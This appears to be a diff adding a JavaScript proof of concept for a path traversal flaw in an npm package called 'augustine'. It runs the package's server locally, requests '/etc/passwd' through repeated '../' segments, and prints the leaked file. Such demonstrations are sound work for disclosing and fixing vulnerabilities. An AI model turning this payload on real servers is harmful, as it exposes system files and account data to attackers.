@@ -1,0 +1,20 @@
+```javascript
+const http = require("http");
+const augustine = require("./node_modules/augustine");
+
+const PORT = 8123;
+augustine.start(PORT, "127.0.0.1");
+
+setTimeout(() => {
+  const traversal = "/" + "../".repeat(10) + "etc/passwd";
+  http.get({ host: "127.0.0.1", port: PORT, path: traversal }, (res) => {
+    let body = "";
+    res.on("data", (chunk) => (body += chunk));
+    res.on("end", () => {
+      console.log("Status:", res.statusCode);
+      console.log("Leaked file contents:\n", body);
+      process.exit(0);
+    });
+  });
+}, 300);
+```
